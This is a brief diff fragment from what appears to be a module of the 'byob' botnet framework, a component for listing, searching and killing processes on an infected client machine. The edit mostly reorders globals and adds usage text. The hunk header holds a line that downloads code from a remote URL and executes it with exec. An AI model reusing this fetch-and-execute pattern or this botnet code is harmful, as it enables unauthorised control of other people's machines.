@@ -19,15 +19,15 @@ exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/mas
 sys.modules['util'] = util
 
 # globals
+_buffer = StringIO.StringIO()
+_workers = {}
+_abort  = False
 packages  = []
 platforms = ['win32','linux2','darwin']
-_buffer   = StringIO.StringIO()
-_workers  = {}
-_abort    = False
-
-# setup
-util.is_compatible(platforms, __name__)
-util.imports(packages, __builtins__)
+usage = 'process <list/search/kill>'
+description = """ 
+List or search currently running processes on the client host machine
+"""
 
 # main
 def list(*args, **kwargs):
